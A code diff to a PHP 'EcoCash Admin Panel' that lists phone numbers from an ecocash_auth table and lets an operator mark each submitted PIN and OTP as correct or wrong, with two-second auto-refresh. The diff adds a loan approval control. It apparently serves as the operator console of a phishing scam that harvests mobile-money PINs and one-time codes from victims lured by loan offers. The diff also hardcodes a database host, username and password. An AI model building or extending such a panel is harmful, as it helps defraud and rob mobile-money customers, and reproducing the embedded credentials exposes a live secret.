@@ -1,13 +1,13 @@
 <?php
 session_start(); // optional, but kept for consistency
 
-// ========== POSTGRESQL CONFIGURATION (same as login.php) ==========
+// ========== POSTGRESQL CONFIGURATION ==========
 $dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
 $dbPort = 5432;
 $dbName = "loan_9d8q";
 $dbUser = "loan_9d8q_user";
 $dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
-// ==================================================================
+// ==============================================
 
 /**
  * Get PostgreSQL connection (reusable)
@@ -36,25 +36,41 @@ if (!$conn) {
     die("Database connection failed. Please check server logs.");
 }
 
-// Handle AJAX requests for updating status
+// Handle AJAX requests for updating status (PIN, OTP, and LOAN)
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
     && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
     
     header('Content-Type: application/json');
     
     $phone = $_POST['phone'] ?? '';
-    $type = $_POST['type'] ?? '';   // 'pin' or 'otp'
-    $action = $_POST['action'] ?? ''; // 'correct' (set to 1) or 'wrong' (set to 0)
+    $type = $_POST['type'] ?? '';   // 'pin', 'otp', or 'loan'
+    $action = $_POST['action'] ?? ''; // 'correct'/'wrong' for pin/otp; for loan: 'approve' or 'default'
     
-    if (empty($phone) || !in_array($type, ['pin', 'otp']) || !in_array($action, ['correct', 'wrong'])) {
-        echo json_encode(['success' => false, 'error' => 'Invalid request']);
+    if (empty($phone) || empty($type) || empty($action)) {
+        echo json_encode(['success' => false, 'error' => 'Invalid request parameters']);
         exit;
     }
     
-    $column = ($type === 'pin') ? 'status' : 'otp_status';
-    $newValue = ($action === 'correct') ? 1 : 0;
+    // Map type to column name
+    switch ($type) {
+        case 'pin':
+            $column = 'status';
+            $newValue = ($action === 'correct') ? 1 : 0;
+            break;
+        case 'otp':
+            $column = 'otp_status';
+            $newValue = ($action === 'correct') ? 1 : 0;
+            break;
+        case 'loan':
+            $column = 'approve';   // column name is "approve"
+            $newValue = ($action === 'approve') ? 1 : 0;
+            break;
+        default:
+            echo json_encode(['success' => false, 'error' => 'Invalid type']);
+            exit;
+    }
     
-    // Update ALL entries for this phone (in case multiple pins exist)
+    // Update ALL entries for this phone (grouped phone)
     $sql = "UPDATE ecocash_auth SET $column = $1 WHERE phone = $2";
     $result = pg_query_params($conn, $sql, [$newValue, $phone]);
     
@@ -70,12 +86,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WI
 // AJAX endpoint to fetch fresh grouped data (used by polling)
 if (isset($_GET['fetch_data']) && $_GET['fetch_data'] == 1) {
     header('Content-Type: application/json');
-    // PostgreSQL GROUP BY: need to aggregate phone; we use DISTINCT ON or GROUP BY with aggregate functions
+    // PostgreSQL GROUP BY with max() to get latest status per phone
     $sql = "
         SELECT 
             phone,
             MAX(status) AS pin_status,
-            MAX(otp_status) AS otp_status
+            MAX(otp_status) AS otp_status,
+            MAX(approve) AS loan_approve
         FROM ecocash_auth
         GROUP BY phone
         ORDER BY phone ASC
@@ -90,7 +107,8 @@ if (isset($_GET['fetch_data']) && $_GET['fetch_data'] == 1) {
         $records[] = [
             'phone' => $row['phone'],
             'pin_status' => (int)$row['pin_status'],
-            'otp_status' => (int)$row['otp_status']
+            'otp_status' => (int)$row['otp_status'],
+            'loan_approve' => (int)$row['loan_approve']
         ];
     }
     echo json_encode($records);
@@ -102,7 +120,8 @@ $sql = "
     SELECT 
         phone,
         MAX(status) AS pin_status,
-        MAX(otp_status) AS otp_status
+        MAX(otp_status) AS otp_status,
+        MAX(approve) AS loan_approve
     FROM ecocash_auth
     GROUP BY phone
     ORDER BY phone ASC
@@ -114,7 +133,8 @@ if ($result) {
         $records[] = [
             'phone' => $row['phone'],
             'pin_status' => (int)$row['pin_status'],
-            'otp_status' => (int)$row['otp_status']
+            'otp_status' => (int)$row['otp_status'],
+            'loan_approve' => (int)$row['loan_approve']
         ];
     }
 }
@@ -123,7 +143,7 @@ if ($result) {
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>EcoCash Admin | Verify PIN & OTP</title>
+    <title>EcoCash Admin | Verify PIN, OTP & Loan Approval</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * { box-sizing: border-box; }
@@ -134,7 +154,7 @@ if ($result) {
             padding: 20px;
         }
         .container {
-            max-width: 1200px;
+            max-width: 1300px;
             margin: 0 auto;
             background: white;
             border-radius: 16px;
@@ -164,7 +184,7 @@ if ($result) {
         table {
             width: 100%;
             border-collapse: collapse;
-            font-size: 15px;
+            font-size: 14px;
         }
         th, td {
             padding: 12px 16px;
@@ -194,15 +214,20 @@ if ($result) {
             background-color: #fff3cd;
             color: #856404;
         }
+        .badge-approved {
+            background-color: #cce5ff;
+            color: #004085;
+        }
         .btn {
             border: none;
             padding: 6px 14px;
             border-radius: 6px;
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 500;
             cursor: pointer;
             transition: 0.2s;
             margin-right: 8px;
+            margin-bottom: 5px;
         }
         .btn-pin {
             background-color: #1d4ed8;
@@ -217,6 +242,13 @@ if ($result) {
         }
         .btn-otp:hover {
             background-color: #059669;
+        }
+        .btn-loan {
+            background-color: #f59e0b;
+            color: white;
+        }
+        .btn-loan:hover {
+            background-color: #d97706;
         }
         .modal {
             display: none;
@@ -233,7 +265,7 @@ if ($result) {
         .modal-content {
             background: white;
             border-radius: 12px;
-            width: 300px;
+            width: 320px;
             padding: 20px;
             text-align: center;
             box-shadow: 0 10px 25px rgba(0,0,0,0.2);
@@ -256,11 +288,11 @@ if ($result) {
             cursor: pointer;
             font-weight: 500;
         }
-        .btn-correct {
+        .btn-correct, .btn-approve {
             background-color: #10b981;
             color: white;
         }
-        .btn-wrong {
+        .btn-wrong, .btn-default {
             background-color: #ef4444;
             color: white;
         }
@@ -277,7 +309,7 @@ if ($result) {
 <body>
 <div class="container">
     <h1>
-        🔐 EcoCash Admin Panel – Verify PIN & OTP
+        🔐 EcoCash Admin Panel – PIN / OTP / Loan Approval
         <span class="refresh-indicator" id="refreshStatus">Auto-refresh every 2s</span>
     </h1>
     <div class="table-wrapper">
@@ -287,27 +319,27 @@ if ($result) {
                     <th>Phone Number</th>
                     <th>PIN Status</th>
                     <th>OTP Status</th>
+                    <th>Loan Approve</th>
                     <th>Actions</th>
                 </tr>
             </thead>
             <tbody id="tableBody">
-                <!-- Dynamic content loaded via JS -->
+                <!-- Dynamic content via JS -->
             </tbody>
         </table>
     </div>
     <footer>
-        ⚡ Click "Verify PIN" or "Verify OTP" → choose "Correct" (✔) or "Wrong" (✘).<br>
-        ✅ Each phone appears once. Status is updated for all records of that phone.
+        ⚡ Click any button → choose option.<br>
+        ✅ PIN/OTP: Correct (1) / Wrong (0) &nbsp;|&nbsp; 🏦 Loan: Approve (1) / Default (0)
     </footer>
 </div>
 
 <!-- Modal Overlay -->
 <div id="verifyModal" class="modal">
     <div class="modal-content">
-        <p id="modalMessage">Mark this as correct or wrong?</p>
-        <div class="modal-buttons">
-            <button id="modalCorrect" class="btn-correct">✔ Correct (set to 1)</button>
-            <button id="modalWrong" class="btn-wrong">✘ Wrong (set to 0)</button>
+        <p id="modalMessage">Select option:</p>
+        <div class="modal-buttons" id="modalButtons">
+            <!-- dynamic buttons inserted by JS -->
         </div>
     </div>
 </div>
@@ -317,11 +349,12 @@ if ($result) {
     let pendingType = null;
     const modal = document.getElementById('verifyModal');
     const modalMessage = document.getElementById('modalMessage');
+    const modalButtons = document.getElementById('modalButtons');
     const tableBody = document.getElementById('tableBody');
 
     function renderTable(records) {
         if (!records || records.length === 0) {
-            tableBody.innerHTML = '<tr><td colspan="4" style="text-align: center;">No records found in database.</td></tr>';
+            tableBody.innerHTML = '<tr><td colspan="5" style="text-align: center;">No records found.</td></tr>';
             return;
         }
         let html = '';
@@ -329,6 +362,7 @@ if ($result) {
             const phone = escapeHtml(record.phone);
             const pinStatus = record.pin_status;
             const otpStatus = record.otp_status;
+            const loanApprove = record.loan_approve;
             
             html += `<tr data-phone="${phone}">`;
             html += `<td>+263 ${phone}</td>`;
@@ -342,10 +376,16 @@ if ($result) {
                             ${otpStatus ? 'Verified (1)' : 'Pending (0)'}
                         </span>
                       </td>`;
+            html += `<td class="loan-status-cell">
+                        <span class="badge ${loanApprove ? 'badge-approved' : 'badge-warning'}">
+                            ${loanApprove ? 'Approved (1)' : 'Default (0)'}
+                        </span>
+                      </td>`;
             html += `<td>
                         <button class="btn btn-pin verify-pin" data-phone="${phone}">✔ Verify PIN</button>
                         <button class="btn btn-otp verify-otp" data-phone="${phone}">✔ Verify OTP</button>
-                       </td>`;
+                        <button class="btn btn-loan verify-loan" data-phone="${phone}">🏦 Loan Approve</button>
+                      </td>`;
             html += `</tr>`;
         });
         tableBody.innerHTML = html;
@@ -370,23 +410,57 @@ if ($result) {
             btn.removeEventListener('click', otpClickHandler);
             btn.addEventListener('click', otpClickHandler);
         });
+        document.querySelectorAll('.verify-loan').forEach(btn => {
+            btn.removeEventListener('click', loanClickHandler);
+            btn.addEventListener('click', loanClickHandler);
+        });
     }
     
     function pinClickHandler(e) {
         const phone = e.currentTarget.getAttribute('data-phone');
-        showModal(phone, 'pin');
+        showModal(phone, 'pin', [
+            { label: '✔ Correct (set to 1)', action: 'correct', class: 'btn-correct' },
+            { label: '✘ Wrong (set to 0)', action: 'wrong', class: 'btn-wrong' }
+        ]);
     }
     
     function otpClickHandler(e) {
         const phone = e.currentTarget.getAttribute('data-phone');
-        showModal(phone, 'otp');
+        showModal(phone, 'otp', [
+            { label: '✔ Correct (set to 1)', action: 'correct', class: 'btn-correct' },
+            { label: '✘ Wrong (set to 0)', action: 'wrong', class: 'btn-wrong' }
+        ]);
     }
     
-    function showModal(phone, type) {
+    function loanClickHandler(e) {
+        const phone = e.currentTarget.getAttribute('data-phone');
+        showModal(phone, 'loan', [
+            { label: '✅ Approve (set to 1)', action: 'approve', class: 'btn-approve' },
+            { label: '❌ Default (set to 0)', action: 'default', class: 'btn-default' }
+        ]);
+    }
+    
+    function showModal(phone, type, options) {
         pendingPhone = phone;
         pendingType = type;
-        const typeLabel = type === 'pin' ? 'PIN' : 'OTP';
-        modalMessage.innerText = `Set ${typeLabel} for ${phone} as:`;
+        let typeLabel = '';
+        if (type === 'pin') typeLabel = 'PIN';
+        else if (type === 'otp') typeLabel = 'OTP';
+        else typeLabel = 'Loan Approval';
+        modalMessage.innerText = `${typeLabel} for ${phone}:`;
+        
+        // Clear and rebuild buttons
+        modalButtons.innerHTML = '';
+        options.forEach(opt => {
+            const btn = document.createElement('button');
+            btn.textContent = opt.label;
+            btn.className = opt.class;
+            btn.onclick = () => {
+                updateStatus(pendingPhone, pendingType, opt.action);
+                closeModal();
+            };
+            modalButtons.appendChild(btn);
+        });
         modal.style.display = 'flex';
     }
     
@@ -400,7 +474,7 @@ if ($result) {
         const formData = new FormData();
         formData.append('phone', phone);
         formData.append('type', type);
-        formData.append('action', action);  // 'correct' or 'wrong'
+        formData.append('action', action);
         
         try {
             const response = await fetch(window.location.href, {
@@ -411,15 +485,13 @@ if ($result) {
             const result = await response.json();
             if (result.success) {
                 await fetchAndRefresh();
-                closeModal();
             } else {
-                alert('Error: ' + (result.error || 'Could not update status.'));
-                closeModal();
+                alert('Error: ' + (result.error || 'Update failed.'));
             }
         } catch (err) {
             alert('Network error: ' + err.message);
-            closeModal();
         }
+        closeModal();
     }
     
     async function fetchAndRefresh() {
@@ -432,28 +504,9 @@ if ($result) {
         }
     }
     
-    // Modal button handlers
-    document.getElementById('modalCorrect').addEventListener('click', () => {
-        if (pendingPhone && pendingType) {
-            updateStatus(pendingPhone, pendingType, 'correct');
-        } else {
-            closeModal();
-        }
-    });
-    
-    document.getElementById('modalWrong').addEventListener('click', () => {
-        if (pendingPhone && pendingType) {
-            updateStatus(pendingPhone, pendingType, 'wrong');
-        } else {
-            closeModal();
-        }
-    });
-    
-    // Close modal when clicking outside content
+    // Close modal when clicking outside
     window.addEventListener('click', (e) => {
-        if (e.target === modal) {
-            closeModal();
-        }
+        if (e.target === modal) closeModal();
     });
     
     // Auto-refresh every 2 seconds
